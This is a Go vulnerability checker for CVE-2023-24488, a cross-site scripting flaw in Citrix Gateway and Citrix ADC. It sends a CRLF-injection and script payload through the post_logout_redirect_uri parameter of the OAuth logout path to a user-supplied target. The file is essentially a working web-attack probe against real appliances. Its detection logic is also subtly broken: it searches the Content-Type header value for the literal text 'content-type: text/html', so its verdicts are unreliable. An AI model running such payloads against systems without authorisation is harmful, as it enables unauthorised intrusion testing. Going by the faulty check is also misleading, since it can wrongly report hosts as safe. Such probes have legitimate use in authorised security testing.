package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func main() {
	fmt.Print("Enter target URL: ")
	var targetURL string
	fmt.Scanln(&targetURL)

	if checkCVE202324488(targetURL) {
		fmt.Println("Vulnerable to CVE-2023-24488: Citrix Gateway and Citrix ADC - Cross-Site Scripting")
	} else {
		fmt.Println("Not vulnerable to CVE-2023-24488")
	}
}

func checkCVE202324488(url string) bool {
	path := "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>"
	resp, err := http.Get(url + path)
	if err != nil {
		fmt.Println("Error:", err)
		return false
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error:", err)
		return false
	}

	contentType := resp.Header.Get("Content-Type")
	statusCode := resp.StatusCode

	return strings.Contains(string(body), "<script>alert(document.domain)</script>") &&
		strings.Contains(strings.ToLower(contentType), "content-type: text/html") &&
		statusCode == 302
}
